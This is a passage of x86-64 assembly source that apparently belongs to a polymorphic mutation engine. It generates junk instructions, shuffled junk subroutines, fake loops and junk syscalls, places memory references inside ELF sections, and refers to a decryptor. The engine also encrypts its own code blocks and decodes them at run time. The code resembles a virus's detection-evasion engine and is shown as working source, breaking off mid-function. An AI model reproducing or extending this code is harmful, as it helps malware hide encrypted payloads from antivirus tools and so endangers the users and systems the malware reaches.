ADD_FUNCTION
get_junk_parameters:
		POLY_DEBUG_STRING +get_junk_parameters
		BEGIN_EBLOCK
		xor	rsi,rsi
		mov	eax,[g_byteregs]
		lea	rbx,[.get_regb]
		cmp	al,-1
		je	.no_regb
		push	rbx
		inc	esi
	.no_regb:
		add	rbx,(.get_regw - .get_regb)
		or	ah,bit(_SP)
		cmp	ah,-1
		je	.no_regw
		push	rbx
		inc	esi
	.no_regw:
		shr	eax,16
		add	rbx,(.get_regr - .get_regw)
		cmp	al,-1
		je	.no_regr
		push	rbx
		inc	esi
	.no_regr:
		mov	dl,al
		test	esi,esi
		jz	.do_rbx
		push	rsi
		pop	rax
		call rand
		mov	rax,[rsp+(rax*8)]
		call	rax
		lea	rsp,[rsp+(rsi*8)]
	.choose_cl:
		call rand_any
		mov	cl,0x87
		and	cl,al
		test	dh,0x80 + 0x20 + 8 + 4 + 2
		jz	.check_h
	.check_sp:
		cmp	cl,_SP
		je	.choose_cl
	.check_h:
		mov	bl,0x80 + 0x20
		cmp	dh,1
		jne	.check_h2
		cmp	dl,_AH
		jb	.check_h2
		and	cl,7
		jmp	.check_same
	.check_h2:
		test	dh,1
		jz	.check_same
		test	cl,cl
		js	.check_same
		test	cl,4	; spl/bpl/sil/dil
		jz	.check_same
		or	cl,0x20
	.check_same:
		;mov	bl,0x80 + 0x20
		mov	bh,bl
		and	bh,dh
		and	bl,cl
		cmp	bh,bl
		jne	.do_rbx
		mov	bl,0x7
		and	bl,cl
		cmp	dl,bl
		je	.choose_cl
	.do_rbx:
		call	rand_any
		push	rax
		pop	rbx
		call	rand_prob
		js	.exit
		movsx	rbx,bl
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -get_junk_parameters
		ret

	.get_regb:
		POLY_DEBUG_STRING *get_regb
		BEGIN_EBLOCK
		mov	dh,1
		call	get_free_regb
		mov	dl,al
		END_EBLOCK
		ret

	.get_regw:
		POLY_DEBUG_STRING *get_regw
		BEGIN_EBLOCK
		mov	ch,1
		call get_AL_1248
		mov	dh,al
		call	get_free_regw
		mov	dl,al
		cmp	al,_SP
		jb	.wx
		mov	al,5
		call rand_al
		jnz	.wx
		mov	dh,0x21
	.wx:	END_EBLOCK
		ret

	.get_regr:
		POLY_DEBUG_STRING *get_regr
		BEGIN_EBLOCK
		xor	ch,ch
		call get_AL_1248
		mov	dh,0x80
		or	dh,al
		call	get_free_regr
		mov	dl,al
		END_EBLOCK
		ret

;-[get_write_dx]--------------------------------------------------------------
; possibly set dx to write to memory
ADD_FUNCTION
get_write_dx:	POLY_DEBUG_STRING +get_write_dx
		BEGIN_EBLOCK
		push	rax
		call rand_prob
		jns	.no_reg
		cmp	byte [g_poly_mem_reg_write],0
		je	.no_reg
		mov	ax,[g_poly_mem_reg_dx]
		cmp	al,-1
		je	.no_reg
		test	dh,1
		jnz	.no_reg
		and	dh,8+4+2+1
		and	ah,0x80
		or	ah,dh
		or	ah,0x40
		push	rax
		pop	rdx
		jmp	.exit
	.no_reg:bt	dword [g_poly_flags],RETAL_POLY_STACK_VARS_INIT
		jc	.prob
		cmp	qword [g_poly_bss_base],0
		je	.exit
		cmp	byte [g_bss_has_relocs],0
		jne	.exit
	.prob:	mov	al,3
		call rand_al
		jnz	.exit
		mov	dl,0xFF
		cmp	dh,0x81
		je	.exit
		and	dh,0xF
	.exit	pop	rax
		END_EBLOCK
		POLY_DEBUG_STRING -get_write_dx
		ret

;-[get_read_dx]---------------------------------------------------------------
; possibly set dx to read from memory
ADD_FUNCTION
get_read_dx:	POLY_DEBUG_STRING +get_read_dx
		BEGIN_EBLOCK
		push	rax
		call rand_prob
		jns	.no_reg
		test	dh,1
		jnz	.no_reg
		mov	ax,[g_poly_mem_reg_dx]
		cmp	al,-1
		je	.no_reg
		and	dh,8+4+2+1
		and	ah,0x80
		or	ah,dh
		or	ah,0x40
		push	rax
		pop	rdx
		jmp	.exit
	.no_reg:bt	dword [g_poly_flags],RETAL_POLY_STACK_VARS_INIT
		jc	.prob
		cmp	qword [g_poly_bss_base],0
		jne	.prob
		cmp	qword [g_poly_data_base],0
		jne	.prob
		cmp	qword [g_poly_rodata_base],0
		je	.exit
	.prob:	mov	al,3
		call rand_al
		jnz	.exit
		mov	dl,0xFE
		cmp	dh,0x81
		je	.exit
		and	dh,0xF
	.exit	pop	rax
		END_EBLOCK
		POLY_DEBUG_STRING -get_read_dx
		ret

;-[get_read_cl]---------------------------------------------------------------
; possibly set cl to read from memory
ADD_FUNCTION
get_read_cl:	POLY_DEBUG_STRING +get_read_cl
		BEGIN_EBLOCK
		push	rdx
		cmp	dl,0xFE
		jae	.exit
		test	dh,0x40
		jnz	.exit
		call get_read_dx
		test	dh,0x40
		jz	.not_reg
		and	dh,0x80 + 0x40
		mov	cl,dl
		or	cl,dh
		jmp	.exit
	.not_reg:
		cmp	dl,0xFE
		jne	.exit
		mov	cl,0x7F
	.exit	pop	rdx
		END_EBLOCK
		POLY_DEBUG_STRING -get_read_cl
		ret

;-[get_write_cl]--------------------------------------------------------------
; possibly set cl to write from memory
ADD_FUNCTION
get_write_cl:	POLY_DEBUG_STRING +get_write_cl
		BEGIN_EBLOCK
		push	rdx
		cmp	dl,0xFE
		jae	.exit
		test	dh,0x40
		jnz	.exit
		call get_write_dx
		test	dh,0x40
		jz	.not_reg
		and	dh,0x80 + 0x40
		mov	cl,dl
		or	cl,dh
		jmp	.exit
	.not_reg:
		cmp	dl,0xFF
		jne	.exit
		mov	cl,0x7E
	.exit:	pop	rdx
		END_EBLOCK
		POLY_DEBUG_STRING -get_write_cl
		ret

;-[emit_mem_address]----------------------------------------------------------
; emit read/write memory address with modrm in al
; dl = FF or sil = 7E for write, cl = number of trail bytes
ADD_FUNCTION
emit_mem_address:
		POLY_DEBUG_STRING +emit_mem_address
		BEGIN_EBLOCK
		multipush rbx,rax,rcx,rdx,rbp
		push	rax
		mov	byte [g_poly_last_mem_write],0
		xor	rax,rax
		push	rax
		pop	rbx
		lea	rbp,[.do_stack]
		bt	dword [g_poly_flags],RETAL_POLY_STACK_VARS_INIT
		jnc	.test_write
		push	rbp
		inc	eax
	.test_write:
		cmp	dl,0xFF
		sete	bl
		cmp	sil,0x7E
		sete	bh
		or	bl,bh		; bl = 1 if request is write
		jnz	.try_bss
	.try_data:
		lea	rbp,[.do_data]
		cmp	qword [g_poly_data_base],0
		je	.try_rodata
		push	rbp
		inc	eax
	.try_rodata:
		lea	rbp,[.do_rodata]
		cmp	qword [g_poly_rodata_base],0
		je	.try_bss
		push	rbp
		inc	eax
	.try_bss:
		lea	rbp,[.do_bss]
		cmp	qword [g_poly_bss_base],0
		je	.pick
		test	bl,bl
		jz	.r_bss
		cmp	byte [g_bss_has_relocs],0
		jne	.pick
	.r_bss:	push	rbp
		inc	eax
	.pick:	lea	rbp,[rax*8]
		call rand
		mov	rdx,[rsp+(rax*8)]
		add	rsp,rbp
		pop	rax
		jmp	rdx

	; stack var
	.do_stack:
		mov	byte [g_poly_last_mem_write],1
		or	al,0x44
		mov	ah,0x24
		stosw
	.stack_l:mov	al,[g_poly_stack_var_count]
		call rand_al
		add	al,[g_current_stack_count]
		shl	eax,3
		cmp	eax,0x7F
		ja	.stack_l
		stosb
		jmp	.exit

	; .bss immediate
	.do_bss:cmp	byte [g_bss_has_relocs],0
		jne	.bss_lea
		mov	byte [g_poly_last_mem_write],1
	.bss_lea:
		lea	rbp,[g_poly_bss_base]
		jmp	.do_imm

	; .data immediate
	.do_data:
		lea	rbp,[g_poly_data_base]
		jmp	.do_imm

	; .rodata immediate
	.do_rodata:
		lea	rbp,[g_poly_rodata_base]

	; encode immediate (rip rel)
	.do_imm:or	al,5
		stosb
		cmp	cl,8
		jne	.no64
		mov	cl,4
	.no64:	movzx	rcx,cl
		mov	rbx,[rbp]
		mov	rax,[rbp+8]
		call rand
		add	rbx,rax
		lea	rax,[rdi+4]
		call	rax_to_vaddr
		sub	rax,rbx
		neg	rax
		sub	rax,rcx
		stosd
	.exit:	multipop rbx,rax,rcx,rdx,rbp
		END_EBLOCK
		POLY_DEBUG_STRING -emit_mem_address
		ret

;-[alloc_stack_vars]----------------------------------------------------------
; allocate junk vars on stack.
ADD_FUNCTION
alloc_stack_vars:
		POLY_DEBUG_STRING +alloc_stack_vars
		BEGIN_EBLOCK_OPCODE
		bt	dword [g_poly_flags],RETAL_POLY_STACK_VARS
		jnc	.exit
		movzx	rbx,byte [g_poly_stack_var_count]
		shl	bl,3
		mov	dh,8
		mov	dl,_SP
		mov	ch,_SUB
		INT3_CALL emit_op_80
		bts	dword [g_poly_flags],RETAL_POLY_STACK_VARS_INIT
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -alloc_stack_vars
		ret

;-[do_poly_section]-----------------------------------------------------------
; store section base and size if applicable.
; ecx = section, rdi = pointer to base variable.
ADD_FUNCTION
do_poly_section:POLY_DEBUG_STRING +do_poly_section
		BEGIN_EBLOCK_OPCODE
		xor	rax,rax		; rax = base
		push	rax
		pop	rdx		; rdx = size
		jrcxz	.store
		INT3_CALL zf_if_ofile
		jz	.store
		INT3_CALL get_section_by_index
		mov	rdx,[rbx+Elf64_Shdr.sh_size]
		sub	rdx,8
		jbe	.store
		mov	rax,[rbx+Elf64_Shdr.sh_addr]
	.store:	stosq
		push	rdx
		pop	rax
		stosq
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -do_poly_section
		ret

;-[emit_subroutine]-----------------------------------------------------------
; emit 1 junk subroutine and fix up call
; rsi = JUNK_CALL structure
ADD_FUNCTION
emit_subroutine:POLY_DEBUG_STRING +emit_subroutine
		BEGIN_EBLOCK_OPCODE
		push	qword [g_poly_flags]
		push	qword [g_bytereg_table]
		push	qword [g_wordreg_table]
		push	qword [g_rexreg_table]
		multipush rax,rsi,rbx,rcx
		; HEADS OR TAILS
	.dil:	INT3_CALL rand_any
		and	rax,16
		lea	rcx,[g_poly_header_start]
		add	rcx,rax
		mov	rdi,[rcx]
		cmp	rdi,[rcx+8]
		jae	.dil
		push	rcx
		; FLAGS
		INT3_CALL rand_any
		and	eax,bit(RETAL_POLY_USE_STACK_JUNK)|bit(RETAL_POLY_STACK_VARS)
		or	eax,bit(RETAL_POLY_IN_CALL)|bit(RETAL_POLY_EXE_BIG_JUNK)
		and	dword [g_poly_flags],bit(RETAL_POLY_IN_LOOP)|bit(RETAL_POLY_NO_SYSCALLS)|bit(RETAL_POLY_IN_JUNK)
		or	[g_poly_flags],eax
		; REGS
		mov	rbx,[rsi+JUNK_CALL.used_regs]
		mov	[g_byteregs],rbx
		push	rdi
		push	24
		pop	rcx
		lea	rdi,[g_bytereg_table]
	.rl:		shr	ebx,1
			sbb	al,al
			stosb
			loop	.rl
		pop	rdi
		; FIXUP
		mov	rbx,[rsi+JUNK_CALL.rel32]
		push	rdi
		pop	rax
		INT3_CALL set_rel32
		; STACK ALLOC
		mov	byte [g_current_stack_count],0
		INT3_CALL alloc_stack_vars
		; JUNK
		INT3_CALL big_junk_x2
	.no_j2:
		; CLEAR STACK
		bt	dword [g_poly_flags],RETAL_POLY_STACK_VARS
		jnc	.no_clear_stack_vars
		mov	al,[g_poly_stack_var_count]
		add	[g_current_stack_count],al
	.no_clear_stack_vars:
		btr	dword [g_poly_flags],RETAL_POLY_STACK_VARS_INIT
		INT3_CALL junk_clear_stack
		; RET
		mov	al,0xC3
		stosb
		pop	rcx
		mov	[rcx],rdi
		multipop rax,rsi,rbx,rcx
		pop	qword [g_rexreg_table]
		pop	qword [g_wordreg_table]
		pop	qword [g_bytereg_table]
		pop	qword [g_poly_flags]
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_subroutine
		ret

;-[do_subroutines]------------------------------------------------------------
; generate all sub-routines after decryptor
ADD_FUNCTION
do_subroutines:	POLY_DEBUG_STRING +do_subroutines
		BEGIN_EBLOCK_OPCODE
		multipush rsi,rbx
		INT3_CALL zf_if_ofile
		jz	.done
	.next_set:
		mov	rsi,[g_poly_first_call]
		mov	rbx,[g_poly_current_call]
		mov	[g_poly_first_call],rbx
		INT3_CALL shuffle_subroutines
		.call:	cmp	rsi,rbx
			je	.try_next_set
			INT3_CALL emit_subroutine
			add	rsi,JUNK_CALL_size
			jmp	.call
	.try_next_set:
		cmp	rsi,[g_poly_current_call]
		jne	.next_set
	.done:	multipop rsi,rbx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -do_subroutines
		ret

;-[shuffle_subroutines]-------------------------------------------------------
; shuffle subroutines between rsi and rbx
ADD_FUNCTION
shuffle_subroutines:
		POLY_DEBUG_STRING +shuffle_subroutines
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		sub	rbx,rsi
		je	.exit
		shr	rbx,4
		push	64
		pop	rcx
	.loop:		push	rbx
			pop	rax
			INT3_CALL rand
			shl	rax,4
			mov	rdx,[rsi+rax]
			mov	rdi,[rsi+rax+8]
			xchg	rdx,[rsi]
			xchg	rdi,[rsi+8]
			mov	[rsi+rax],rdx
			mov	[rsi+rax+8],rdi
			loop	.loop
	.exit:	call	_popa
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -shuffle_subroutines
		ret

;-[junk_if_branch]------------------------------------------------------------
; generate test instruction for if[else], return bl = branch condition

%define _4byte(a,b,c,d) (a|(b << 8)|(c << 16)|(d << 24))

ADD_FUNCTION
junk_if_branch:	POLY_DEBUG_STRING +junk_if_branch
		BEGIN_EBLOCK_OPCODE
	.retry:	push	1
		pop	rbp
		mov	ebx,_4byte(_cNZ,_cNS,_cG,_cC)
		INT3_CALL get_junk_parameters
		cmp	dl,-1
		je	.exit
		xor	esi,esi
		mov	al,7
		INT3_CALL rand_al
		jnz	.try_btr
		INT3_CALL junk_op_0FBA			; BTx reg,imm8
		jmp	.bt
	.try_btr:
		dec	eax
		jnz	.try_test
		INT3_CALL junk_op_0FA3			; BTx reg,reg
	.bt:	mov	ebx,_4byte(_cC,_cC,_cC,_cC)
		jmp	.exit
	.try_test:
		dec	ebp
		dec	eax
		jnz	.try_cmp_imm
		INT3_CALL gen_test_reg
		mov	ebx,_4byte(_cNZ,_cNS,_cNZ,_cL)	; test reg
		jmp	.exit
	.try_cmp_imm:
		INT3_CALL get_read_dx
		dec	eax
		jnz	.try_cmp_reg
		mov	ch,_CMP
		INT3_CALL emit_op_80
		mov	ebx,_4byte(_cNZ,_cA,_cC,_cG)	; CMP imm
		jmp	.exit
	.try_cmp_reg:
		dec	eax
		jnz	.try_test_imm
		mov	ch,_CMP
		INT3_CALL emit_op_rr
		mov	ebx,_4byte(_cNZ,_cS,_cL,_cG)	; CMP r/m
		jmp	.exit
	.try_test_imm:
		dec	eax
		jnz	.try_test_reg
		mov	ch,_TEST
		INT3_CALL emit_op_F6
		mov	ebx,_4byte(_cZ,_cS,_cZ,_cL)	; TEST imm
		jmp	.exit
	.try_test_reg:
		dec	eax
		mov	ch,_TEST_rm
		INT3_CALL emit_op_rr
		mov	ebx,_4byte(_cZ,_cS,_cS,_cG)	; TEST reg
	.exit:	test	ebp,ebp
		jnz	.retry
		mov	al,0x4
		INT3_CALL rand_al
		lea	rcx,[rax*8]
		shr	ebx,cl
		INT3_CALL rand_prob
		js	.no_xor
		xor	bl,1
	.no_xor:END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -junk_if_branch
		ret

;-[choose_loop_type]----------------------------------------------------------
; return ptr to random loop type struc in rax
ADD_FUNCTION
choose_loop_type:
		POLY_DEBUG_STRING +choose_loop_type
		BEGIN_EBLOCK_OPCODE
		push	rdi
		lea	rdi,[loop_type_table]
		mov	al,LOOP_TYPE_COUNT
		INT3_CALL rand_al
		imul	eax,eax,LOOP_TYPE_SIZE
		add	rax,rdi
		pop	rdi
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -choose_loop_type
		ret

;-[load_loop_count]-----------------------------------------------------------
; load count register for a loop
; dx = count register, rbx = loop count, rax = loop struc, r14b = 0 for dec, non-zero for inc
; return rbx = actual load value
ADD_FUNCTION
load_loop_count:POLY_DEBUG_STRING +load_loop_count
		BEGIN_EBLOCK_OPCODE
		multipush rcx
		mov	rcx,[rax+1]	; X, INC
		test	r14b,r14b
		pushf
		jnz	.use_inc
		mov	rcx,[rax+9]	; Y, DEC
	.use_inc:
		test	dh,8
		jnz	.got_rcx
		test	dh,4
		jnz	.do32
		shr	rcx,16	; 16-bit
	.do32:	shr	rcx,32	; 32-bit
	.got_rcx:
		popf
		jz	.use_dec
		neg	rbx
	.use_dec:
		add	rbx,rcx
		push	rbx
		INT3_CALL load_reg_nc
		pop	rbx
		multipop rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_loop_count
		ret

;-[gen_loop_branch]-----------------------------------------------------------
; generate loop inc/dec/add/sub [test]
; dx = loop reg, rax = loop type struc, r14b = 0 for dec, non-zero for inc, r15b = non-zero to copy to r13
; return r8b = loop condition
ADD_FUNCTION
gen_loop_branch:POLY_DEBUG_STRING +gen_loop_branch
		BEGIN_EBLOCK_OPCODE
		push	rdi
		mov	r8b,[rax]
		mov	cl,_SUB
		mov	ch,_DEC
		test	r14b,r14b
		jz	.do_dec
		mov	cl,_ADD
		mov	ch,_INC
		cmp	r8b,_cG
		jne	.try_GE
		mov	r8b,_cL
		jmp	.do_dec
	.try_GE:cmp	r8b,_cGE
		jne	.do_dec
		mov	r8b,_cNO
	.do_dec:END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		cmp	r8B,_cNC
		je	.do80
		cmp	r8b,_cC
		je	.do80c
		INT3_CALL rand_prob
		js	.do80
		INT3_CALL emit_op_FE
		jmp	.do_branch
	.do80:	mov	ch,cl
		push	1
		pop	rbx
		jmp	.e80
	.do80c:	push	-1
		pop	rbx
		mov	ch,_ADD^_SUB
		xor	ch,cl
	.e80:	INT3_CALL emit_op_80
	.do_branch:
		pop	r12
		test	r15b,r15b
		jz	.no_copy
		INT3_CALL copy_from_r12
	.no_copy:
		lea	rbx,[loop_type_last_test]
		cmp	rax,rbx
		ja	.no_test
		INT3_CALL rand_prob
		jpe	.no_test
		INT3_CALL small_junk
		INT3_CALL gen_test_reg
	.no_test:
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -gen_loop_branch
		ret

;-[load_syscall_reg]----------------------------------------------------------
; load register for junk syscall.
; dx = register, al = arg type
ADD_FUNCTION
load_syscall_reg:
		POLY_DEBUG_STRING +load_syscall_reg
		BEGIN_EBLOCK_OPCODE
		test	al,al
		jz	.exit
		cmp	al,JUNK_SYSCALL_ANY
		je	.any
		cmp	al,JUNK_SYSCALL_BAD_FD
		je	.bad_fd
		cmp	al,JUNK_SYSCALL_BAD_MEM
		je	.bad_mem
		cmp	al,JUNK_SYSCALL_RW_SIZE
		je	.rw_size
		cmp	al,JUNK_SYSCALL_CONST
		je	.const
		cmp	al,JUNK_SYSCALL_WHENCE
		je	.whence
		cmp	al,JUNK_SYSCALL_BAD_WHENCE
		je	.bad_whence
		cmp	al,JUNK_SYSCALL_GOOD_MEM
		je	.good_mem
		cmp	al,JUNK_SYSCALL_UNALIGNED
		je	.unaligned
		cmp	al,JUNK_SYSCALL_BAD_MEM_ALIGNED
		je	.bad_aligned
		cmp	al,JUNK_SYSCALL_SIGNED
		je	.signed
		cmp	al,JUNK_SYSCALL_7
		je	.do7
	.any:	INT3_CALL rand_prob
		js	.exit
		INT3_CALL rand_any
		push	rax
		pop	rbx
		jmp	.load
	.bad_fd:mov	al,7
		INT3_CALL rand_al
		add	al,3
		push	rax
		pop	rbx
		jmp	.load
	.bad_mem:
		INT3_CALL rand_any
		push	rax
		pop	rbx
		test	rbx,rbx
		js	.bad_mem_test
		and	rbx,4095
	.bad_mem_test:
		test	ebx,-(1024 * 2048)
		jz	.bad_mem
		jmp	.load
	.rw_size:
		mov	eax,64 * 1024
		INT3_CALL rand
		lea	rbx,[rax+1]
		jmp	.load
	.const:	mov	rbx,[g_poly_syscall]
		movsx	rbx,dword [rbx+JUNK_SYSCALL.const]
		jmp	.load
	.whence:mov	al,3
		INT3_CALL rand_al
		push	rax
		pop	rbx
		jmp	.load
	.bad_whence:
		INT3_CALL rand_any
		cmp	rax,2
		jbe	.bad_whence
		push	rax
		pop	rbx
		jmp	.load
	.good_mem:
		mov	rbx,[g_poly_data_base]
		mov	rax,[g_poly_data_size]
		INT3_CALL rand
		add	rbx,rax
		jmp	.load
	.unaligned:
		INT3_CALL rand_any
		test	ax,0xFFF
		jz	.unaligned
		push	rax
		pop	rbx
		jmp	.load
	.bad_aligned:
		INT3_CALL rand_any
		;bts	rax,63
		mov	rbx,0x8000_0000_0000_0000
		and	rax,-(2048 * 1024)
		or	rax,rbx
		push	rax
		pop	rbx
		jmp	.load
	.signed:INT3_CALL rand_any
		mov	rbx,0x8000_0000_0000_0000
		or	rbx,rax
		jmp	.load
	.do7:	mov	al,8
		INT3_CALL rand_al
		push	rax
		pop	rbx
	.load:	mov	al,dl
		test	dh,dh
		jns	.aw
		INT3_CALL alloc_regr
		jmp	.lr
	.aw:	INT3_CALL alloc_regw
	.lr:	INT3_CALL load_reg_nc
		INT3_CALL small_junk
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_syscall_reg
		ret

;-[load_syscall_ax]-----------------------------------------------------------
; load rax for junk syscall
ADD_FUNCTION
load_syscall_ax:POLY_DEBUG_STRING +load_syscall_ax
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		xor	al,al
		INT3_CALL alloc_regw
		mov	rax,[g_poly_syscall]
		movzx	rbx,byte [rax+JUNK_SYSCALL._ax]
		cmp	ebx,127 ; bad syscall number?
		jne	.do_dx
		mov	al,64
		INT3_CALL rand_al
		lea	rbx,[rax+350]
	.do_dx:	xor	dl,dl
		mov	dh,8
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_syscall_ax
		ret

;-[load_syscall_di]-----------------------------------------------------------
; load rdi for junk syscall
ADD_FUNCTION
load_syscall_di:POLY_DEBUG_STRING +load_syscall_di
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	rax,[g_poly_syscall]
		mov	al,[rax+JUNK_SYSCALL._di]
		mov	dl,_DI
		mov	dh,8
		INT3_CALL load_syscall_reg
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_syscall_di
		ret


;-[load_syscall_si]-----------------------------------------------------------
; load rsi for junk syscall
ADD_FUNCTION
load_syscall_si:POLY_DEBUG_STRING +load_syscall_si
		BEGIN_EBLOCK_OPCODE
		mov	rax,[g_poly_syscall]
		mov	al,[rax+JUNK_SYSCALL._si]
		mov	dl,_SI
		mov	dh,8
		INT3_CALL load_syscall_reg
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_syscall_si
		ret

;-[load_syscall_dx]-----------------------------------------------------------
; load rdx for junk syscall
ADD_FUNCTION
load_syscall_dx:POLY_DEBUG_STRING +load_syscall_dx
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	rax,[g_poly_syscall]
		mov	al,[rax+JUNK_SYSCALL._dx]
		mov	dl,_DX
		mov	dh,8
		INT3_CALL load_syscall_reg
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_syscall_dx
		ret

;-[load_syscall_r10]----------------------------------------------------------
; load r10 for junk syscall
ADD_FUNCTION
load_syscall_r10:POLY_DEBUG_STRING +load_syscall_r10
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	rax,[g_poly_syscall]
		mov	al,[rax+JUNK_SYSCALL._r10]
		mov	dl,_R10
		mov	dh,0x88
		INT3_CALL load_syscall_reg
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_syscall_r10
		ret

;-[big_junk_syscall]----------------------------------------------------------
; generate junk syscall
ADD_FUNCTION
big_junk_syscall:
		POLY_DEBUG_STRING +big_junk_syscall
		CHECK_BREAKPOINT
		test	dword [g_poly_flags],bit(RETAL_POLY_IN_LOOP)|bit(RETAL_POLY_NO_SYSCALLS)
		jnz	small_junk
		cmp	byte [g_poly_call_depth],1
		ja	small_junk
		CHECK_BREAKPOINT
		BEGIN_EBLOCK_OPCODE
		mov	eax,[g_poly_flags]
		push	rax
		; choose syscall
		mov	al,JUNK_SYSCALLS_COUNT
		INT3_CALL rand_al
		imul	rsi,rax,JUNK_SYSCALL_size
		lea	rax,[junk_syscall_table]
		add	rsi,rax
		mov	[g_poly_syscall],rsi
		push	JUNK_SYSCALL_size - 4
		pop	rcx
		call	RDA_Decode
		call	rand_any
		mov	[rsi+JUNK_SYSCALL.rand_pad],ax
		; save state
		mov	ebx,[g_byteregs]
		push	rbx
		push	qword [g_bytereg_table]
		push	qword [g_wordreg_table]
		push	qword [g_rexreg_table]
		; save regs
		mov	ah,bit(_R11)
		mov	al,bit(_AX)|bit(_CX)
		cmp	byte [rsi+JUNK_SYSCALL._di],JUNK_SYSCALL_NONE
		je	.no_di
		or	al,bit(_DI)
	.no_di: cmp	byte [rsi+JUNK_SYSCALL._si],JUNK_SYSCALL_NONE
		je	.no_si
		or	al,bit(_SI)
	.no_si:	cmp	byte [rsi+JUNK_SYSCALL._dx],JUNK_SYSCALL_NONE
		je	.no_dx
		or	al,bit(_DX)
	.no_dx:	cmp	byte [rsi+JUNK_SYSCALL._r10],JUNK_SYSCALL_NONE
		je	.push_it
		or	ah,bit(_R10)
	.push_it:
		INT3_CALL push_used_regs
		push	rax
		mov	[g_poly_syscall_rdi],rdi
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		; load regs
		lea	rsi,[LOAD_SYSCALL_CALL_TABLE]
		push	LOAD_SYSCALL_CALL_TABLE_COUNT
		pop	rcx
		INT3_CALL call_table_all
		; syscall
		INT3_CALL emit_syscall
		INT3_CALL junk_syscall_check
		; restore
		pop	rbx
		INT3_CALL pop_used_regs
		pop	qword [g_rexreg_table]
		pop	qword [g_wordreg_table]
		pop	qword [g_bytereg_table]
		pop	rbx
		mov	[g_byteregs],ebx
		pop	rax
		mov	[g_poly_flags],eax
		mov	rsi,[g_poly_syscall]
		push	JUNK_SYSCALL_size - 4
		pop	rcx
		call	RDA_Encode_CRC
		and	qword [g_poly_syscall],0
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -big_junk_syscall
		ret

BEGIN_CALL_TABLE LOAD_SYSCALL_CALL_TABLE
	CALL_TABLE_ITEM	load_syscall_ax
	CALL_TABLE_ITEM	load_syscall_di
	CALL_TABLE_ITEM	load_syscall_si
	CALL_TABLE_ITEM	load_syscall_dx
	CALL_TABLE_ITEM	load_syscall_r10
END_CALL_TABLE

BEGIN_CALL_TABLE CHECK_SYSCALL_CALL_TABLE
	CALL_TABLE_ITEM junk_syscall_check_none
	CALL_TABLE_ITEM junk_syscall_check_forward
	CALL_TABLE_ITEM junk_syscall_check_backwards
	CALL_TABLE_ITEM junk_syscall_check_reg_branch
END_CALL_TABLE

;-[emit_syscall]--------------------------------------------------------------
; emit syscall instruction, check if mem reg is r11 or rcx
ADD_FUNCTION
emit_syscall:	BEGIN_EBLOCK_OPCODE
		multipush rax,rdx
		mov	ax,0x050F		; syscall
		stosw
		mov	al,_CX
		INT3_CALL free_regw
		mov	al,_R11
		INT3_CALL free_regr
		mov	dx,[g_poly_mem_reg_dx]
		cmp	dx,0x800 + _CX
		je	.do_free
		cmp	dx,0x8800 +_R11
		jne	.exit
	.do_free:
		or	word [g_poly_mem_reg_dx],-1
	.exit:	multipop rax,rdx
		END_EBLOCK_OPCODE
		ret

;-[junk_syscall_cmp]----------------------------------------------------------
; compare for correct syscall error code.
ADD_FUNCTION
junk_syscall_cmp:
		BEGIN_EBLOCK_OPCODE
		mov	rax,[g_poly_syscall]
		movsx	rbx,byte [rax+JUNK_SYSCALL._err]
		mov	dh,8
		mov	dl,0
		INT3_CALL rand_prob
		jpe	.no4
		mov	dh,4
	.no4:	js	.no_neg
		neg	rbx
		mov	ch,_NEG
		INT3_CALL emit_op_F6
	.no_neg:INT3_CALL CH_add_sub
		test	ch,ch
		jnz	.not_add
		neg	rbx
		jmp	.op80
	.not_add:
		cmp	ch,_OR
		jne	.op80
		mov	ch,_CMP
	.op80:	INT3_CALL emit_op_80
		END_EBLOCK_OPCODE
		ret

;-[junk_syscall_check]--------------------------------------------------------
; optional check of syscall return value branching over bad junk
ADD_FUNCTION
junk_syscall_check:
		POLY_DEBUG_STRING +junk_syscall_check
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		push	qword [g_bytereg_table]
		push	qword [g_wordreg_table]
		push	qword [g_rexreg_table]
		mov	rax,[g_poly_syscall]
		cmp	byte [rax+JUNK_SYSCALL._err],0
		je	.exit
		mov	al,CHECK_SYSCALL_CALL_TABLE_COUNT
		lea	rsi,[CHECK_SYSCALL_CALL_TABLE]
		INT3_CALL call_table_rand
	.exit:	pop	qword [g_rexreg_table]
		pop	qword [g_wordreg_table]
		pop	qword [g_bytereg_table]
		multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -junk_syscall_check
	junk_syscall_check_none:
		ret

;-[junk_syscall_check_forward]------------------------------------------------
ADD_FUNCTION
junk_syscall_check_forward:
		BEGIN_EBLOCK_OPCODE
		INT3_CALL junk_syscall_cmp
		mov	al,0x70+_cZ
		stosb
		push	rdi
		; save state before bad junk
		push	qword [g_poly_flags]
		mov	eax,[g_poly_mem_reg_dx]
		shl	rax,8
		mov	al,[g_current_stack_count]
		push	rax
		; trash state and create bad junk
		INT3_CALL free_all_regs
